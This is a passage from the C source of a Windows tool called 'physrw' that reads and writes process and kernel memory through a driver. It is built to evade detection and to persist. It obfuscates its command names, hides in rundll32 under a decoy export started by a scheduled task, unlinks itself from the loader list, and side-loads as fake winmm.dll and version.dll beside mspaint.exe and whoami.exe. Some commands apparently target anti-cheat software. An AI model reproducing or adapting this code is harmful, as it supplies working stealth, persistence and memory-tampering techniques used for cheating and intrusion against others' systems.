                        OPEN_EXISTING, 0, NULL);
        if (p == INVALID_HANDLE_VALUE) return FALSE;
    }
    DWORD w = 0;
    char al[64];
    int aln = _snprintf(al, sizeof al, "%s\n",
                        xo_a((char[24]){0}, 24, OB_AUTH, OB_AUTH_N),
                        (unsigned long long)pipe_secret());
    if (!WriteFile(p, al, (DWORD)aln, &w, NULL) || w != (DWORD)aln) {
        CloseHandle(p);
        return FALSE;
    }
    char nl = '\n';        // empty command - conn_thread exits clean
    WriteFile(p, &nl, 1, &w, NULL);
    CloseHandle(p);
    return TRUE;
}

static int dstart_spawn(void)
{
    wchar_t exe[MAX_PATH], cl[MAX_PATH + 32];
    GetModuleFileNameW(NULL, exe, MAX_PATH);
    _snwprintf(cl, MAX_PATH + 32, L"\"%ls\" %ls", exe, dq(OB_CDD, OB_CDD_N));
    cl[MAX_PATH + 31] = 0;
    STARTUPINFOW si; PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof si); si.cb = sizeof si;
    if (!CreateProcessW(NULL, cl, NULL, NULL, FALSE,
                        CREATE_DEFAULT_ERROR_MODE | CREATE_BREAKAWAY_FROM_JOB,
                        NULL, NULL, &si, &pi)) {
        if (GetLastError() != ERROR_ACCESS_DENIED ||
            !CreateProcessW(NULL, cl, NULL, NULL, FALSE,
                            CREATE_DEFAULT_ERROR_MODE,
                            NULL, NULL, &si, &pi)) {
            printf("[-] spawn: CreateProcess err=%lu\n", GetLastError());
            return 1;
        }
        printf("[spawn] breakaway denied - child stays in our job\n");
    }
    CloseHandle(pi.hThread);
    printf("[spawn] daemon pid=%lu t0=%lu - waiting for pipe...", pi.dwProcessId, GetTickCount());
    for (int i = 0; i < 60; i++) {
        if (i && i % 10 == 0) printf(" [%d t=%lu]", i, GetTickCount());
        if (pipe_alive()) {
            printf(" UP\n[+] daemon ready - commands auto-forward, survives ssh exit\n");
            CloseHandle(pi.hProcess);
            return 0;
        }
        if (WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0) {
            printf(" DIED\n[-] daemon exited during boot (device already held?)\n");
            CloseHandle(pi.hProcess);
            return 1;
        }
        Sleep(100);                      // THE bug: loop burned 60 probes in <1ms
    }
    printf(" TIMEOUT (6s)\n");
    CloseHandle(pi.hProcess);
    return 1;
}

// command dispatch - shared by direct mode and daemon connections
static int dispatch(int argc, wchar_t **argv)
{
    const wchar_t *cmd = argv[1];

    if (!wcscmp(cmd, L"auto") || !wcscmp(cmd, L"a")) {
        if (!g_daemon) load_state();              // reuse stored dev name if any
        int rc = 1;
        if (g_daemon) {
            rc = cmd_auto();                      // device+sec already held
        } else if (open_dev()) {
            g_path = fetch_sec() ? 1 : 0;
            st.path = g_path;
            if (!g_path) printf("[!] path 1 unavailable - E044 views (v2p limited)\n");
            printf("[+] device %ls (read path %d)\n", g_dev, g_path);
            rc = cmd_auto();
            CloseHandle(hdev);
        }
        return rc;
    }
    if (!wcscmp(cmd, L"load")) {
        if (g_daemon) {
            printf("[-] load disabled while daemon runs (stop first)\n");
            return 1;
        }
        load_state();
        if (argc < 3) {
            printf("usage: load <svcname>   (device becomes \\\\.\\<svcname>)\n");
            return 1;
        }
        return cmd_load(argv[2]);
    }
    if (wq(cmd, OB_CUN, OB_CUN_N)) {
        if (g_daemon) {
            printf("[-] unload disabled while daemon runs (device held)\n");
            return 1;
        }
        if (argc < 3) {
            printf("usage: unload <svcname>\n");
            return 1;
        }
        return cmd_unload(argv[2]);
    }
    if (wq(cmd, OB_CVG, OB_CVG_N)) return cmd_vgkdat();
    // no-device commands: never open a window (persistence probes)
    if (!wcscmp(cmd, L"maps"))   return cmd_maps();
    if (wq(cmd, OB_CW0, OB_CW0_N)) {
        if (argc < 5) { printf("usage: %ls <pid> <va_hex> <len> [interval_ms]\n", dq(OB_CW0, OB_CW0_N)); return 1; }
        UINT32 len = (UINT32)wnum(argv[4]);
        if (!len || len > 0x1000) { printf("[-] len must be 1..0x1000\n"); return 1; }
        DWORD iv = argc > 5 ? (DWORD)wnum(argv[5]) : 0;
        return cmd_watch0(wnum(argv[2]), whex(argv[3]), len, iv);
    }
    if (wq(cmd, OB_CF0, OB_CF0_N)) {
        if (argc < 5) { printf("usage: %ls <pid> <va_hex> <hexstring> [interval_ms]\n", dq(OB_CF0, OB_CF0_N)); return 1; }
        DWORD iv = argc > 5 ? (DWORD)wnum(argv[5]) : 50;
        return cmd_freeze0(wnum(argv[2]), whex(argv[3]), argv[4], iv);
    }
    if (wq(cmd, OB_CPR, OB_CPR_N)) {
        if (argc < 3) { printf("usage: %ls <va_hex> [len]\n", dq(OB_CPR, OB_CPR_N)); return 1; }
        UINT32 len = argc > 3 ? (UINT32)wnum(argv[3]) : 32;
        return cmd_proberd(whex(argv[2]), len);
    }
    if (wq(cmd, OB_CPW, OB_CPW_N)) {
        if (argc < 4) { printf("usage: %ls <va_hex> <hexstring>\n", dq(OB_CPW, OB_CPW_N)); return 1; }
        return cmd_probewr(whex(argv[2]), argv[3]);
    }
    if (!wcscmp(cmd, L"init")) {
        if (argc < 3) {
            printf("no constants given - did you mean: auto (derives everything)\n");
            return 1;
        }
        return cmd_init(argc, argv);
    }
    if (wq(cmd, OB_CSP, OB_CSP_N)) {
        if (!g_daemon) load_state();
        if (argc < 3) { printf("usage: %ls <0|1>  (0=E044 driver views, 1=usermode physmem handle)\n", dq(OB_CSP, OB_CSP_N)); return 1; }
        st.path = (int)wnum(argv[2]) ? 1 : 0;
        if (!save_state()) return 1;
        printf("[+] read path = %d (%s)\n", st.path, st.path ? "usermode physmem handle" : "E044 driver views");
        return 0;
    }
    if (!wcscmp(cmd, L"help") || !wcscmp(cmd, L"-h")) { usage(argv[0]); return 0; }

    if (!g_daemon) {
        if (!load_state()) {
            printf("[-] no state file - run: init <kernel_cr3_hex> [nt_hex] [sep_hex]\n");
            return 1;
        }
        if (!st.cr3) { printf("[-] state has no cr3 - run init\n"); return 1; }
    }

    int rc = 1;
    BOOL have = g_daemon ? TRUE : open_dev();
    if (have) {
        if (!g_daemon) {
            g_path = fetch_sec() ? 1 : 0;  // path 1 preferred (PT pages readable)
            if (g_path != st.path) { st.path = g_path; }
            if (!g_path) printf("[!] path 1 unavailable - E044 views (v2p limited)\n");
        }
        if (!wcscmp(cmd, L"procs"))
            rc = cmd_procs();
        else if (!wcscmp(cmd, L"rd")) {
            if (argc < 4) { printf("usage: rd <pid> <va_hex> [len]\n"); }
            else {
                UINT32 len = argc > 4 ? (UINT32)wnum(argv[4]) : 0x40;
                if (!len || len > 0x1000) len = 0x1000;
                rc = cmd_rd(wnum(argv[2]), whex(argv[3]), len);
            }
        }
        else if (!wcscmp(cmd, L"wr")) {
            if (argc < 5) { printf("usage: wr <pid> <va_hex> <hexbytes..>\n"); }
            else rc = cmd_wr(wnum(argv[2]), whex(argv[3]), argc, argv);
        }
        else if (!wcscmp(cmd, L"watch")) {
            if (argc < 5) {
                printf("usage: watch <pid> <va_hex> <len> [interval_ms]"
                       "  (interval 0/omitted = one-shot)\n");
            } else {
                UINT32 len = (UINT32)wnum(argv[4]);
                if (!len || len > 0x1000) { printf("[-] len must be 1..0x1000\n"); }
                else {
                    DWORD iv = argc > 5 ? (DWORD)wnum(argv[5]) : 0;
                    rc = cmd_watch(wnum(argv[2]), whex(argv[3]), len, iv);
                }
            }
        }
        else if (!wcscmp(cmd, L"freeze")) {
            if (argc < 5) {
                printf("usage: freeze <pid> <va_hex> <hexstring> [interval_ms]"
                       "  (hexstring = one arg, e.g. 0000803F; interval 0 = one-shot)\n");
            } else {
                DWORD iv = argc > 5 ? (DWORD)wnum(argv[5]) : 50;
                rc = cmd_freeze(wnum(argv[2]), whex(argv[3]), argv[4], iv);
            }
        }
        else if (!wcscmp(cmd, L"kr")) {
            if (argc < 3) { printf("usage: kr <va_hex> [len]\n"); }
            else {
                UINT32 len = argc > 3 ? (UINT32)wnum(argv[3]) : 0x20;
                if (!len || len > 0x1000) len = 0x1000;
                rc = cmd_kr(whex(argv[2]), len);
            }
        }
        else if (wq(cmd, OB_CHD, OB_CHD_N)) {
            rc = cmd_hide();                    // refuses - PG tripwire proof
        }
        else if (wq(cmd, OB_COM, OB_COM_N)) {
            rc = cmd_omstrip(0);                  // manual = full strip
        }
        else if (!wcscmp(cmd, L"mod")) {
            if (argc < 3) { printf("usage: mod <pid>\n"); }
            else rc = cmd_mod(wnum(argv[2]));
        }
        else if (wq(cmd, OB_CMS, OB_CMS_N)) {
            rc = cmd_mapself(argc > 2 ? (int)wnum(argv[2]) : 0);
        }
        else if (wq(cmd, OB_CMB, OB_CMB_N)) {
            if (argc < 4) { printf("usage: %ls <pa_hex> <size_hex> [w]\n", dq(OB_CMB, OB_CMB_N)); rc = 1; }
            else rc = cmd_mapbig(whex(argv[2]), (UINT32)whex(argv[3]),
                                 argc > 4 ? (int)wnum(argv[4]) : 0);
        }
        else if (wq(cmd, OB_CFM, OB_CFM_N)) {
            rc = cmd_fullmap();
        }
        else { usage(argv[0]); rc = 1; }
        if (!g_daemon) CloseHandle(hdev);
    }
    return rc;
}

// shared CLI entry - used by wmain (exe build) and the DLL hosts' DllMain.
// argv[0] is the host executable path (or "physrw"); argv[1] is the command.
static int physrw_entry(int argc, wchar_t **argv)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    const wchar_t *cmd = argv[1];

    if (wq(cmd, OB_CDD, OB_CDD_N)) return daemon_main();  // internal respawn entry
    if (wq(cmd, OB_CDT, OB_CDT_N))  return dstart_spawn();
    if (wq(cmd, OB_CDS, OB_CDS_N)) {
        int f = pipe_forward(argc, argv);
        return f >= 0 ? f : (printf("[-] daemon not running\n"), 1);
    }
    if (!wcscmp(cmd, L"help") || !wcscmp(cmd, L"-h")) { usage(argv[0]); return 0; }
    int frc = pipe_forward(argc, argv);  // BEFORE any direct open (Exclusive!)
    if (frc >= 0) return frc;
    return dispatch(argc, argv);
}

int wmain(int argc, wchar_t **argv)
{
    if (argc < 2) { usage(argc ? argv[0] : L"physrw"); return 1; }
    return physrw_entry(argc, argv);
}

#ifdef PHYSRW_DLL

// is_our_cmd: shared, defined above (outside the ifdef) - conn_thread's
// command gate uses the same list as the DLL host claim-checks.

static unsigned __stdcall daemon_thread(void *arg)
{
    (void)arg;
    return (unsigned)daemon_main();
}

#ifdef PHYSRW_RUNDLL           // rundll32.exe host: image path stays System32

// daemon host: schtasks -> rundll32.exe dmocache.dll,CacheSync
__declspec(dllexport) void CALLBACK CacheSync(HWND w, HINSTANCE h, LPSTR c, int s)
{
    (void)w; (void)h; (void)c; (void)s;
    set_self_mod(h);                      // real base (rundll32 passes its own hinst)
    self_tarnen();                        // cmdline decoy + LDR unlink
    uintptr_t t = _beginthreadex(NULL, 0, daemon_thread, NULL, 0, NULL);
    if (t) CloseHandle((HANDLE)t);
    // rundll32 exits the moment this returns - park forever and let the
    // daemon thread own the process lifetime.
    Sleep(INFINITE);
}

__declspec(dllexport) void CALLBACK CacheQuery(HWND w, HINSTANCE h, LPSTR c, int s)
{
    (void)w; (void)h; (void)s;
    set_self_mod(h);                      // real base (rundll32 passes its own hinst)
    self_tarnen();                        // cmdline decoy + LDR unlink
    if (!c || !*c) return;
    {
        HANDLE so = GetStdHandle(STD_OUTPUT_HANDLE);
        if (so == NULL || so == INVALID_HANDLE_VALUE) {
            if (AttachConsole(ATTACH_PARENT_PROCESS)) {
                _wfreopen(L"CONOUT$", L"w", stdout);
                _wfreopen(L"CONOUT$", L"w", stderr);
            }
        }
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    wchar_t wcl[4096];
    if (!MultiByteToWideChar(CP_UTF8, 0, c, -1, wcl, 4096)) return;
    wchar_t *av[64], scratch[4096];
    int n = split_line(wcl, av, 64, scratch);
    if (n < 1 || !is_our_cmd(av[0])) return;  // not ours: rundll32 exits clean
    wchar_t *dav[66];
    dav[0] = (wchar_t *)L"physrw";
    for (int i = 0; i < n && i < 64; i++) dav[i + 1] = av[i];
    int rc = physrw_entry(n + 1, dav);
    TerminateProcess(GetCurrentProcess(), (UINT)rc);
}
#endif

#ifdef PHYSRW_DAEMON           // winmm.dll next to mspaint.exe - persistent host
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l)
{
    (void)l;
    if (r != DLL_PROCESS_ATTACH) return TRUE;
    DisableThreadLibraryCalls((HMODULE)h);
    uintptr_t t = _beginthreadex(NULL, 0, daemon_thread, NULL, 0, NULL);
    if (t) CloseHandle((HANDLE)t);
    return TRUE;               // mspaint runs normally; daemon lives beside it
}
#endif

#ifdef PHYSRW_CLIENT           // version.dll next to whoami.exe - one-shot host
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l)
{
    (void)l;
    if (r != DLL_PROCESS_ATTACH) return TRUE;
    DisableThreadLibraryCalls((HMODULE)h);
    wchar_t *cl = GetCommandLineW();
    wchar_t scratch[4096]; wchar_t *av[64];
    int n = split_line(cl, av, 64, scratch);
    if (n < 2 || !is_our_cmd(av[1])) return TRUE;  // not ours: normal whoami
    if (wq(av[1], OB_CDD, OB_CDD_N)) {
        uintptr_t t = _beginthreadex(NULL, 0, daemon_thread, NULL, 0, NULL);
        if (t) CloseHandle((HANDLE)t);
        Sleep(INFINITE);
        return TRUE;
    }
    // DllMain blocks the host main until we return; do the work now, then kill
    // the process without loader-lock re-entry (ExitProcess would deadlock).
    int rc = physrw_entry(n, av);
    TerminateProcess(GetCurrentProcess(), (UINT)rc);
    return TRUE;               // not reached
}
#endif
#endif /* PHYSRW_DLL */
